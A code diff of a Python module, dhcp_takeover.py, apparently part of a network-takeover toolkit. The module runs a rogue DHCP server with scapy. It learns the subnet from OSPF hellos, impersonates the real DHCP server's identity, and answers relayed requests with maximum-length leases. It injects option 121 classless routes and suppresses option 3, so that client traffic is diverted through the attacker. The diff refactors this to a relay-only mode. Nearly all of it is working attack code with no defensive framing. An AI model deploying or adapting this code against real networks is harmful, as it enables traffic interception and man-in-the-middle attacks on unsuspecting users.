@@ -6,7 +6,6 @@ dhcp_takeover.py — DHCP engine for the network-takeover toolkit.
 A library module (no orchestration of its own — see main.py).  Provides:
 
   Network setup (OSPF-derived):
-    pick_client_ip          Choose our IP from the OSPF-learned subnet.
     send_dhcpdiscover       Single untagged DHCPDISCOVER to find the real server.
     sniff_dhcpoffer         Capture the resulting DHCPOFFER (server IP + DNS).
     build_server_details_from_ospf  Assemble the server_details dict that the
@@ -25,7 +24,6 @@ import random
 import shutil
 import socket
 import subprocess
-import time
 
 from scapy.all import (
     BOOTP,
@@ -46,8 +44,6 @@ MAX_DHCP_LEASE_TIME = 0xFFFFFFFF
 DHCP_T1_FACTOR = 0.5
 DHCP_T2_FACTOR = 0.875
 DEFAULT_INTERFACE = "eth0"
-INTERFACE_IPV4_WAIT_INTERVAL = 2
-INTERFACE_IPV4_WAIT_TIMEOUT = 60
 DHCP_SNIFF_FILTER = "udp and (port 67 or 68) or (vlan and udp and (port 67 or 68))"
 DHCP_DISCOVER_TYPES = {1, "discover"}
 DHCP_OFFER_TYPES = {2, "offer"}
@@ -204,24 +200,6 @@ def get_first_ipv4_address(value):
 
 # ── OSPF-derived network setup ────────────────────────────────────────────────
 
-def pick_client_ip(ospf_params, host_offset=2):
-    """Pick an IP in the OSPF-learned subnet for our own interface.
-
-    Starts at network_address + host_offset and skips the SVI gateway IP so we
-    never collide with the router.  Raises ValueError if the subnet is too small.
-    """
-    network = ipaddress.IPv4Network(
-        f"{ospf_params['src_ip']}/{ospf_params['netmask']}", strict=False
-    )
-    gateway = ipaddress.IPv4Address(ospf_params["src_ip"])
-    candidate = network.network_address + host_offset
-    while candidate <= network.broadcast_address:
-        if candidate != gateway and candidate != network.network_address and candidate != network.broadcast_address:
-            return str(candidate)
-        candidate += 1
-    raise ValueError(f"No usable host IP found in {network} (gateway={gateway})")
-
-
 def send_dhcpdiscover(interface):
     """Broadcast a single untagged DHCPDISCOVER to find the real DHCP server.
 
@@ -277,42 +255,34 @@ def sniff_dhcpoffer(interface, timeout=10):
 
 
 def build_server_details_from_ospf(interface, ospf_params, source_ip,
-                                   relay_ip=None, offer=None, dns=None):
+                                   offer=None, dns=None):
     """Build the server_details dict consumed by the rogue DHCP server.
 
-    ospf_params   — learned from sniff_ospf_hellos (gives subnet + gateway).
-    source_ip     — IP used as DHCP server_id (option 54) in responses; set to
-                    the real DHCP server IP for impersonation.
-    relay_ip      — our actual interface IP, used as the option 121 next-hop so
-                    the victim ARPs our MAC.  MUST be different from source_ip
-                    when source_ip is a loopback alias — the loopback has no
-                    ARP presence on the LAN so the victim can't reach it.
-                    Defaults to source_ip when not supplied.
-    offer         — optional DHCPOFFER dict from sniff_dhcpoffer; populates dns.
-    dns           — manual DNS override (takes precedence over offer).
+    ospf_params  — learned from sniff_ospf_hellos (gives subnet + gateway).
+    source_ip    — IP used as DHCP server_id (option 54); set to the real DHCP
+                   server IP for impersonation.
+    offer        — optional DHCPOFFER dict from sniff_dhcpoffer; populates dns.
+    dns          — manual DNS override (takes precedence over offer).
     """
     netmask = ospf_params["netmask"]
     gateway = ospf_params["src_ip"]  # SVI IP = default gateway for this subnet
     network = ipaddress.IPv4Network(f"{gateway}/{netmask}", strict=False)
     resolved_dns = dns or (get_first_ipv4_address(offer.get("dns")) if offer else None)
-    arp_nexthop = relay_ip or source_ip
 
     print_step(
         "OK",
-        f"DHCP server details: server_id={source_ip} relay_ip={arp_nexthop} "
+        f"DHCP server details: server_id={source_ip} "
         f"gateway={gateway} network={network} dns={resolved_dns or 'unknown'}",
     )
     return {
-        "interface":   interface,
-        "source_ip":   source_ip,    # DHCP server_id / option 54 (impersonation)
-        "relay_ip":    arp_nexthop,  # option 121 next-hop (must ARP on victim's LAN)
-        "gateway":     gateway,
-        "netmask":     netmask,
-        "dns":         resolved_dns,
-        "network":     network,
-        "relay_only":  False,
-        "answered_request_xids": set(),
-        "opt121_subnets":           list(HIJACK_ROUTE_PREFIXES),
+        "interface":              interface,
+        "source_ip":              source_ip,
+        "gateway":                gateway,
+        "netmask":                netmask,
+        "dns":                    resolved_dns,
+        "network":                network,
+        "answered_request_xids":  set(),
+        "opt121_subnets":         list(HIJACK_ROUTE_PREFIXES),
         "opt121_default_via_router": False,
     }
 
@@ -335,27 +305,6 @@ def get_interface_ipv4_addresses(interface, scope="global"):
             if inet_index + 1 < len(parts):
                 addresses.append(parts[inet_index + 1])
     return addresses
-
-
-def wait_for_interface_ipv4_address(interface, expected_address=None, timeout=INTERFACE_IPV4_WAIT_TIMEOUT):
-    expected_message = f" {expected_address}" if expected_address else ""
-    print_step("START", f"Waiting for {interface} to have IPv4 address{expected_message}")
-    deadline = time.monotonic() + timeout if timeout is not None else None
-
-    while True:
-        addresses = get_interface_ipv4_addresses(interface)
-        plain_addresses = [address.split("/", 1)[0] for address in addresses]
-        if expected_address:
-            if expected_address in plain_addresses:
-                print_step("OK", f"{interface} has expected IPv4 address {expected_address}")
-                return addresses
-        elif addresses:
-            print_step("OK", f"{interface} has IPv4 address(es): {addresses}")
-            return addresses
-        if deadline is not None and time.monotonic() >= deadline:
-            print_step("FAIL", f"Timed out after {timeout} seconds waiting for IPv4 address on {interface}")
-            raise TimeoutError(f"Timed out waiting for IPv4 address on {interface}")
-        time.sleep(INTERFACE_IPV4_WAIT_INTERVAL)
 
 
 def add_loopback_ipv4_address(address, prefix_length=32):
@@ -393,34 +342,6 @@ def remove_loopback_ipv4_address(address, prefix_length=32):
     print_step("OK", f"Removed loopback alias {address}")
 
 
-def set_static_address_kali(interface, address, netmask, gateway=None):
-    print_step("START", f"Preparing Kali static address setup for {interface}")
-    if shutil.which("dhclient"):
-        run_command(
-            f"Releasing DHCP lease on Linux interface {interface}",
-            ["dhclient", "-r", interface],
-        )
-    else:
-        print_step("SKIP", "dhclient was not found; skipping DHCP lease release")
-    prefix_length = ipaddress.IPv4Network(f"0.0.0.0/{netmask}").prefixlen
-    run_command(
-        f"Flushing addresses on Linux interface {interface}",
-        ["ip", "-4", "addr", "flush", "dev", interface, "scope", "global"],
-    )
-    run_command(
-        f"Adding Linux static IP {address}/{prefix_length} on {interface}",
-        ["ip", "addr", "add", f"{address}/{prefix_length}", "dev", interface],
-    )
-    run_command(f"Bringing Linux interface {interface} up", ["ip", "link", "set", interface, "up"])
-    print_step("SKIP", "Skipping default gateway setup")
-    print_step("OK", f"Completed Kali static address setup for {interface}")
-
-
-def set_static_address(interface, address, netmask, gateway=None):
-    set_static_address_kali(interface, address, netmask, gateway)
-
-
-
 def get_server_mac(server_details):
     server_mac = server_details.get("server_mac")
     if server_mac is None:
@@ -441,47 +362,14 @@ def get_client_key(packet):
 
 
 def get_proposed_lease_key(packet, dhcp_network):
-    bootp = packet[BOOTP]
     xid, client_id = get_client_key(packet)
-    if bootp.giaddr == "0.0.0.0":
-        return (xid, client_id, "direct", str(dhcp_network["network"]))
     return (xid, client_id, "relay", str(dhcp_network["network"]))
-
-
-def get_bootp_client_mac(packet):
-    if not packet.haslayer(BOOTP):
-        return None
-    bootp = packet[BOOTP]
-    hlen = bootp.hlen or 6
-    chaddr = bootp.chaddr
-    if not isinstance(chaddr, bytes):
-        return None
-    client_mac = chaddr[:hlen]
-    if len(client_mac) != 6:
-        return None
-    return client_mac.hex(":")
 
 
 def get_packet_vlan_id(packet):
     if packet.haslayer(Dot1Q):
         return packet[Dot1Q].vlan
     return None
-
-
-def get_direct_client_network(server_details):
-    # Always use the OSPF-derived server subnet as the authoritative pool.
-    # Never derive the pool from the client's preferred IP — a stale lease from
-    # a different VLAN would silently move the pool to the wrong subnet, causing
-    # us to offer and ACK an IP the client can't actually reach.
-    return server_details["network"]
-
-
-def get_direct_client_subnet_mask(network):
-    return str(network.netmask)
-
-
-def get_direct_client_router(network, server_details):
-    return get_default_router_for_network(network, server_details.get("gateway"))
 
 
 def get_default_router_for_network(network, fallback_gateway=None):
@@ -511,59 +399,42 @@ def get_relayed_client_network(giaddr, requested_address):
     return relay_network
 
 
-def get_or_add_dhcp_network(packet, networks, server_details):
+def get_or_add_dhcp_network(packet, networks):
     giaddr = packet[BOOTP].giaddr
-    relay_agent_ip = giaddr
     requested_address = get_requested_or_client_address(packet)
     vlan_id = get_packet_vlan_id(packet)
 
-    if giaddr == "0.0.0.0":
-        network = get_direct_client_network(server_details)
-        subnet_mask = get_direct_client_subnet_mask(network)
-        network_key = ("direct", str(network))
-        router = get_direct_client_router(network, server_details)
-        excluded_addresses = {server_details["source_ip"]}
-        if router:
-            excluded_addresses.add(router)
-        mode = "direct"
-    else:
-        network = get_relayed_client_network(giaddr, requested_address)
-        subnet_mask = DEFAULT_SUBNET_MASK
-        network_key = ("relay", str(network))
-        router = get_default_router_for_network(network, giaddr)
-        excluded_addresses = {giaddr}
-        if router:
-            excluded_addresses.add(router)
-        mode = "relay"
+    network = get_relayed_client_network(giaddr, requested_address)
+    network_key = ("relay", str(network))
+    router = get_default_router_for_network(network, giaddr)
+    excluded_addresses = {giaddr}
+    if router:
+        excluded_addresses.add(router)
 
     for dhcp_network in networks:
         if dhcp_network["key"] == network_key:
-            if mode == "relay":
-                dhcp_network["giaddr"] = giaddr
-                dhcp_network["relay_agent_ip"] = relay_agent_ip
-                dhcp_network["excluded_addresses"].add(giaddr)
-                if router:
-                    dhcp_network["excluded_addresses"].add(router)
+            dhcp_network["giaddr"] = giaddr
+            dhcp_network["excluded_addresses"].add(giaddr)
+            if router:
+                dhcp_network["excluded_addresses"].add(router)
             if vlan_id is not None and dhcp_network.get("vlan_id") != vlan_id:
-                print_step("OK", f"Updating DHCP {mode} network {network} vlan={vlan_id}")
+                print_step("OK", f"Updating relay network {network} vlan={vlan_id}")
                 dhcp_network["vlan_id"] = vlan_id
             return dhcp_network
 
     dhcp_network = {
         "key": network_key,
         "giaddr": giaddr,
-        "relay_agent_ip": relay_agent_ip,
-        "mode": mode,
         "vlan_id": vlan_id,
         "network": network,
-        "subnet_mask": subnet_mask,
+        "subnet_mask": DEFAULT_SUBNET_MASK,
         "router": router,
         "excluded_addresses": excluded_addresses,
         "leased_addresses": set(),
         "proposed_addresses": set(),
     }
     networks.append(dhcp_network)
-    print_step("OK", f"Tracking DHCP {mode} network {network} vlan={vlan_id}")
+    print_step("OK", f"Tracking relay network {network} vlan={vlan_id}")
     return dhcp_network
 
 
@@ -635,42 +506,19 @@ def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_i
     router = dhcp_network["router"]
     vlan_id = dhcp_network.get("vlan_id")
     lease_time = MAX_DHCP_LEASE_TIME
-    is_relayed = dhcp_network["mode"] == "relay"
-    client_mac = get_bootp_client_mac(packet)
-    broadcast_requested = bool(int(bootp.flags) & 0x8000)
-    dst_ip = giaddr if is_relayed or broadcast_requested else offered_ip
-    dst_port = 67 if is_relayed else 68
 
-    # Build option 121 first so we know whether to suppress option 3.
-    #
-    # relay_ip (our actual interface IP) is the ARP-resolvable next-hop for
-    # option 121 routes.  It MUST be our physical interface IP, NOT source_ip
-    # (which may be a loopback alias for the real DHCP server — the loopback has
-    # no ARP presence on the LAN, so victims can't forward traffic to it).
+    # Per RFC 3442: the next-hop for each classless static route MUST be on the
+    # same subnet as the client's interface.  giaddr is the relay agent's
+    # client-facing SVI IP — always on-link for the victim.  OSPF stub injection
+    # for opt121_subnets makes the SVI route that traffic back to us.
     #
     # Per RFC 3442: when option 121 is present, RFC-compliant clients MUST ignore
-    # option 3.  However many real implementations (dhclient, Windows) install
-    # BOTH — and then the VPN's /1 push-routes override everything.  Omitting
-    # option 3 entirely when option 121 covers the default forces correct behaviour
-    # on non-compliant clients, matching what 121.py does.
+    # option 3.  Omitting option 3 when option 121 covers the default forces
+    # correct behaviour on non-compliant clients.
     opt121_routes = []
     if server_details is not None:
-        # RFC 3442 §3: the next-hop for each classless static route MUST be
-        # on the same subnet as the client's interface.
-        # Direct client (giaddr=0.0.0.0): our source_ip IS in their subnet ✓
-        # Relayed client (giaddr!=0.0.0.0): source_ip is a different subnet;
-        #   use giaddr (the relay agent's client-facing IP) which IS on-link.
-        #   OSPF stub injection for opt121_subnets makes the relay agent route
-        #   that traffic back to us.
-        if is_relayed and giaddr and giaddr != "0.0.0.0":
-            # Relayed client: giaddr is the relay agent's client-facing IP — on-link.
-            opt121_nexthop = giaddr
-        else:
-            # Direct client: use relay_ip (our LAN interface IP, ARP-resolvable).
-            # source_ip may be a loopback alias with no ARP presence on the LAN.
-            opt121_nexthop = server_details.get("relay_ip") or server_details.get("source_ip", server_ip)
         for subnet in server_details.get("opt121_subnets", []):
-            opt121_routes.append((subnet, opt121_nexthop))
+            opt121_routes.append((subnet, giaddr))
         if server_details.get("opt121_default_via_router") and router:
             opt121_routes.append(("0.0.0.0/0", router))
 
@@ -710,8 +558,8 @@ def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_i
     )
 
     response = (
-        IP(src=server_ip, dst=dst_ip)
-        / UDP(sport=67, dport=dst_port)
+        IP(src=server_ip, dst=giaddr)
+        / UDP(sport=67, dport=67)
         / BOOTP(
             op=2,
             xid=bootp.xid,
@@ -725,12 +573,7 @@ def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_i
     )
 
     if packet.haslayer(Ether):
-        ether_layer = packet[Ether]
-        if is_relayed:
-            dst_mac = ether_layer.src
-        else:
-            dst_mac = client_mac or ether_layer.src or "ff:ff:ff:ff:ff:ff"
-        ether = Ether(src=server_mac, dst=dst_mac)
+        ether = Ether(src=server_mac, dst=packet[Ether].src)
         if vlan_id is not None:
             response = ether / Dot1Q(vlan=vlan_id) / response
         else:
@@ -779,7 +622,7 @@ def offer_address_to_discover(packet, networks, proposed_leases, server_details)
 
     giaddr = packet[BOOTP].giaddr
     print_step("START", f"Processing DHCPDISCOVER xid={packet[BOOTP].xid} giaddr={giaddr}")
-    dhcp_network = get_or_add_dhcp_network(packet, networks, server_details)
+    dhcp_network = get_or_add_dhcp_network(packet, networks)
 
     lease_key = get_proposed_lease_key(packet, dhcp_network)
     existing_offer = proposed_leases.get(lease_key)
@@ -808,14 +651,7 @@ def offer_address_to_discover(packet, networks, proposed_leases, server_details)
         server_details=server_details,
     )
     log_built_dhcp_response("DHCPOFFER", offer_packet)
-    if dhcp_network["mode"] == "relay":
-        print_step("START", f"Sending DHCPOFFER {offered_ip} to relay {giaddr}")
-    else:
-        print_step(
-            "START",
-            f"Sending DHCPOFFER {offered_ip} directly to client "
-            f"on {dhcp_network['network']} with router {dhcp_network['router']}",
-        )
+    print_step("START", f"Sending DHCPOFFER {offered_ip} to relay {giaddr}")
     sendp(offer_packet, iface=server_details["interface"], verbose=False)
     print_step("OK", f"Sent DHCPOFFER {offered_ip}")
     return offered_ip
@@ -834,7 +670,7 @@ def ack_request(packet, networks, proposed_leases, server_details):
         return None
 
     print_step("START", f"Processing DHCPREQUEST xid={bootp.xid} giaddr={bootp.giaddr}")
-    dhcp_network = get_or_add_dhcp_network(packet, networks, server_details)
+    dhcp_network = get_or_add_dhcp_network(packet, networks)
     server_ip = server_details["source_ip"]
     server_mac = get_server_mac(server_details)
     vlan_id = dhcp_network.get("vlan_id")
@@ -911,10 +747,7 @@ def ack_request(packet, networks, proposed_leases, server_details):
         server_details=server_details,
     )
     log_built_dhcp_response("DHCPACK", ack_packet)
-    if dhcp_network["mode"] == "relay":
-        print_step("START", f"Sending DHCPACK {offered_ip} to relay {dhcp_network['giaddr']}")
-    else:
-        print_step("START", f"Sending DHCPACK {offered_ip} directly to client")
+    print_step("START", f"Sending DHCPACK {offered_ip} to relay {dhcp_network['giaddr']}")
     sendp(ack_packet, iface=server_details["interface"], verbose=False)
     print_step("OK", f"Sent DHCPACK {offered_ip}")
 
@@ -931,7 +764,6 @@ def handle_dhcp_release(packet, networks, server_details):
     if not packet.haslayer(BOOTP):
         return None
 
-    client_mac = get_bootp_client_mac(packet)
     released_ip = packet[BOOTP].ciaddr
     if not released_ip or released_ip == "0.0.0.0":
         return None
@@ -941,24 +773,19 @@ def handle_dhcp_release(packet, networks, server_details):
         if released_ip in dhcp_network["leased_addresses"]:
             dhcp_network["leased_addresses"].discard(released_ip)
             dhcp_network["proposed_addresses"].discard(released_ip)
-            print_step("OK", f"Released {released_ip} from {client_mac} on {dhcp_network['network']}")
+            print_step("OK", f"Released {released_ip} on {dhcp_network['network']}")
             return released_ip
 
-    print_step("SKIP", f"DHCPRELEASE for {released_ip} from {client_mac}: address not in any lease pool")
+    print_step("SKIP", f"DHCPRELEASE for {released_ip}: address not in any lease pool")
     return None
 
 
 def handle_dhcp_client_packet(packet, networks, proposed_leases, server_details):
     """Dispatch DHCPDISCOVER, DHCPREQUEST, DHCPRELEASE, and DHCPNAK; return a result dict or None."""
-    message_type = get_dhcp_option(packet, "message-type")
-    if (
-        server_details.get("relay_only")
-        and packet[BOOTP].giaddr == "0.0.0.0"
-        and message_type not in DHCP_REQUEST_TYPES
-        and message_type not in DHCP_RELEASE_TYPES
-    ):
-        print_step("SKIP", "Ignoring direct DHCP packet in routed-helper workflow")
+    if packet[BOOTP].giaddr == "0.0.0.0":
+        print_step("SKIP", "Ignoring direct DHCP packet (not relayed)")
         return None
+    message_type = get_dhcp_option(packet, "message-type")
 
     if message_type in DHCP_DISCOVER_TYPES:
         offered_ip = offer_address_to_discover(packet, networks, proposed_leases, server_details)
